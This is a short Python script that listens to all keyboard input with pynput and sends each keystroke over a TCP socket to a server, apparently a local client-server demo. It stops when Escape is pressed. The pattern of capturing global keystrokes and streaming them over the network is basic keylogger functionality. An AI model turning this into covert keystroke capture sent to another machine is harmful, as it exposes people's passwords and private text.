import pynput
from pynput.keyboard import Key, Listener
import socket

# Find HOST and PORT
HOST = socket.gethostbyname(socket.gethostname())
PORT = 65432

# Client Server Setup
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(b'Hello, World')
data = s.recv(1024)


# Keyboard Input and Release
def on_input(key):
    print(str(key) + " Pressed")
    s.sendall(str(key).encode())  # converts string to byte, socket takes byte input
    pass


def on_output(key):
    if key == Key.esc:  # Press Escape key to exit the client and server programs
        s.close()
        return False
    pass


with Listener(on_press=on_input, on_release=on_output) as listener:  # Listens for keyboard input and calls functions
    listener.join()

print('Received', repr(data))
